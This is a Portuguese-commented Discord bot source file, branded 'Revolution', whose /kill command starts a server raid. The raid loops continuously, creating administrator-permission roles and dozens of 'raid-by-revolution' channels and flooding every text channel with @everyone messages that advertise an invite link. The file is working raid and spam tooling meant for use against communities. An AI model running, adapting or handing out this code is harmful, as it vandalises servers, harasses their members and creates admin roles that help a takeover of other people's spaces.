const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ============ CLIENT ============
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates
  ]
});

client.commands = new Map();

// ============ GERENCIADOR DE ATAQUE ============
class AttackManager {
  constructor() {
    this.activeAttacks = new Map();
  }

  startAttack(guild, user, motivo, client) {
    const guildId = guild.id;
    
    if (this.activeAttacks.has(guildId)) {
      this.stopAttack(guildId);
    }

    let isRunning = true;

    // CRIAÇÃO RÁPIDA DE CARGOS
    const createRole = async () => {
      if (!isRunning) return;
      try {
        await guild.roles.create({
          name: 'RAID BY REVOLUTION',
          color: '#ff0000',
          permissions: [PermissionsBitField.Flags.Administrator]
        });
        console.log(`🎭 CARGO CRIADO: RAID BY REVOLUTION`);
      } catch (error) {}
    };

    // CRIA CARGOS RAPIDO
    for (let i = 0; i < 10; i++) {
      createRole();
    }
    const roleInterval = setInterval(() => {
      for (let i = 0; i < 5; i++) {
        createRole();
      }
    }, 100);

    // CRIAÇÃO RÁPIDA DE CANAIS
    let channelCounter = 0;
    const createChannel = async () => {
      if (!isRunning) return;
      try {
        channelCounter++;
        const channelName = `raid-by-revolution-${channelCounter}`;
        const existing = guild.channels.cache.find(c => c.name === channelName);
        if (!existing) {
          await guild.channels.create({
            name: channelName,
            type: 0,
            permissionOverwrites: [
              {
                id: guild.id,
                allow: ['ViewChannel', 'SendMessages', 'ReadMessageHistory']
              }
            ]
          });
          console.log(`📁 CANAL CRIADO: #${channelName}`);
        }
      } catch (error) {}
    };

    // CRIA CANAIS RAPIDO
    for (let i = 0; i < 10; i++) {
      createChannel();
    }
    const channelInterval = setInterval(() => {
      for (let i = 0; i < 3; i++) {
        createChannel();
      }
    }, 50);

    // SPAM ULTRARRÁPIDO
    const spamMessages = [
      `SERVIDOR TOMADO POR REVOLUTION, SAIAM DAS TREVAS\n\n${user.tag} INICIOU O ATAQUE\n\nJUNTE-SE A REVOLUTION\nhttps://discord.gg/GJAKrmDuMp\n\nhttps://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif`
    ];

    let messageCount = 0;

    const spamFunction = async () => {
      if (!isRunning) return;
      
      try {
        const channels = guild.channels.cache.filter(ch => 
          ch.isTextBased() && 
          ch.permissionsFor(client.user).has(PermissionsBitField.Flags.SendMessages)
        );
        
        const channelArray = Array.from(channels.values());
        if (channelArray.length === 0) return;

        for (const channel of channelArray.slice(0, 10)) {
          if (!isRunning) break;
          try {
            const randomMessage = spamMessages[0];
            
            const spamEmbed = new EmbedBuilder()
              .setTitle('REVOLUTION')
              .setDescription(randomMessage)
              .setColor('#ff0000')
              .setImage('https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif')
              .setFooter({ text: 'REVOLUTION - SAIAM DAS TREVAS' })
              .setTimestamp();

            await channel.send({ 
              content: `@everyone SERVIDOR TOMADO POR REVOLUTION`,
              embeds: [spamEmbed]
            });
            messageCount++;
          } catch (error) {}
        }
        
        if (messageCount % 10 === 0) {
          console.log(`📢 SPAM #${messageCount} enviado`);
        }
      } catch (error) {}
    };

    const spamInterval = setInterval(spamFunction, 100);
    for (let i = 0; i < 5; i++) {
      setTimeout(spamFunction, i * 10);
    }

    this.activeAttacks.set(guildId, {
      spamInterval,
      channelInterval,
      roleInterval,
      isRunning,
      target: guild.name,
      author: user.tag,
      startTime: new Date(),
      messageCount: 0,
      stop: () => {
        isRunning = false;
        clearInterval(spamInterval);
        clearInterval(channelInterval);
        clearInterval(roleInterval);
        this.activeAttacks.delete(guildId);
        console.log(`🛑 ATAQUE PARADO no servidor ${guild.name}`);
      }
    });

    console.log(`🔥 ATAQUE ULTRARRÁPIDO iniciado no servidor ${guild.name} por ${user.tag}`);
    return this.activeAttacks.get(guildId);
  }

  stopAttack(guildId) {
    const attack = this.activeAttacks.get(guildId);
    if (attack) {
      attack.stop();
      return true;
    }
    return false;
  }

  getStatus(guildId) {
    return this.activeAttacks.get(guildId) || null;
  }
}

const attackManager = new AttackManager();

// ============ LOGGER ============
function log(message, type = 'INFO') {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] [${type}] ${message}`);
  
  const logDir = './logs';
  if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);
  fs.appendFileSync(`${logDir}/bot.log`, `[${timestamp}] [${type}] ${message}\n`);
}

// ============ COMANDO: KILL ============
client.commands.set('kill', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return interaction.reply({
        content: '❌ VOCE PRECISA SER ADMINISTRADOR NO SERVIDOR PARA ATACAR.',
        ephemeral: true
      });
    }

    const motivo = interaction.options.getString('motivo') || 'OPERACAO REVOLUTION - ATAQUE TOTAL';

    try {
      const attack = attackManager.startAttack(interaction.guild, interaction.user, motivo, client);

      const successEmbed = new EmbedBuilder()
        .setTitle('ATAQUE REVOLUTION INICIADO')
        .setColor('#ff0000')
        .setDescription(`O SERVIDOR ${interaction.guild.name} ESTA SOB ATAQUE ULTRARRAPIDO`)
        .addFields(
          { name: 'ALVO', value: interaction.guild.name, inline: true },
          { name: 'MOTIVO', value: motivo, inline: true },
          { name: 'COMANDANTE', value: interaction.user.tag, inline: true },
          { name: 'STATUS', value: 'ATAQUE EM ANDAMENTO (VELOCIDADE MAXIMA)', inline: false },
          { name: 'PARAR', value: 'USE /end PARA PARAR O ATAQUE', inline: false },
          { name: 'CANAIS', value: 'SENDO CRIADOS A CADA 50ms', inline: false },
          { name: 'CARGOS', value: 'SENDO CRIADOS A CADA 100ms', inline: false }
        )
        .setImage('https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHJjZzN4bjQyanp2aW0zejF4aGNuaTdoODA4ZTA0dGdmczc0N2FqMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPSUgEgcFybC36/giphy.gif')
        .setFooter({ text: 'REVOLUTION - ATAQUE ULTRARRAPIDO' })
        .setTimestamp();

      await interaction.reply({ embeds: [successEmbed] });
      log(`🔥 ATAQUE ULTRARRAPIDO iniciado por ${interaction.user.tag} no servidor ${interaction.guild.name}`);

    } catch (error) {
      await interaction.reply({ 
        content: `❌ ERRO AO INICIAR ATAQUE: ${error.message}`,
        ephemeral: true
      });
      log(`Erro no KILL: ${error.message}`, 'ERROR');
    }
  }
});

// ============ COMANDO: END ============
client.commands.set('end', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    const guildId = interaction.guild.id;
    const attack = attackManager.getStatus(guildId);
    
    if (attack) {
      attackManager.stopAttack(guildId);
      
      const embed = new EmbedBuilder()
        .setTitle('ATAQUE PARADO COM SUCESSO')
        .setColor('#00ff00')
        .setDescription('O ATAQUE REVOLUTION FOI DESATIVADO')
        .addFields(
          { name: 'PARADO POR', value: interaction.user.tag, inline: true },
          { name: 'STATUS', value: 'ATAQUE PARADO', inline: true }
        )
        .setFooter({ text: 'REVOLUTION - MODO DESATIVADO' })
        .setTimestamp();

      await interaction.reply({ embeds: [embed] });
      log(`🛑 END executado por ${interaction.user.tag}`);
    } else {
      await interaction.reply({
        content: '❌ NENHUM ATAQUE ATIVO PARA PARAR.',
        ephemeral: true
      });
    }
  }
});

// ============ EVENTOS ============

client.on('ready', () => {
  log(`🚀 Bot ${client.user.tag} esta ONLINE!`);
  log(`📊 Servidores: ${client.guilds.cache.size}`);
  
  client.user.setPresence({
    activities: [{
      name: 'REVOLUTION | /kill para atacar (ULTRARRAPIDO)',
      type: 3,
      state: 'Use /kill para ATACAR'
    }],
    status: 'online'
  });
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  const command = client.commands.get(interaction.commandName);
  if (!command) {
    return interaction.reply({
      content: '❌ COMANDO NAO ENCONTRADO!',
      ephemeral: true
    });
  }

  try {
    await command.execute(interaction);
  } catch (error) {
    log(`Erro no comando ${interaction.commandName}: ${error.message}`, 'ERROR');
    
    if (interaction.replied || interaction.deferred) {
      await interaction.followUp({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    } else {
      await interaction.reply({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    }
  }
});

// ============ SERVIDOR WEB ============
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Bot Revolution esta ONLINE!');
});

app.get('/health', (req, res) => {
  res.json({
    status: 'online',
    uptime: process.uptime(),
    timestamp: new Date().toISOString(),
    ataquesAtivos: attackManager.activeAttacks.size,
    servidores: client.guilds.cache.size
  });
});

app.listen(PORT, () => {
  console.log(`Servidor web rodando na porta ${PORT}`);
});

// ============ LOGIN ============

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
  console.error('TOKEN NAO ENCONTRADO! Configure o .env');
  process.exit(1);
}

client.login(TOKEN).catch(error => {
  log(`Erro ao fazer login: ${error.message}`, 'ERROR');
  process.exit(1);
});
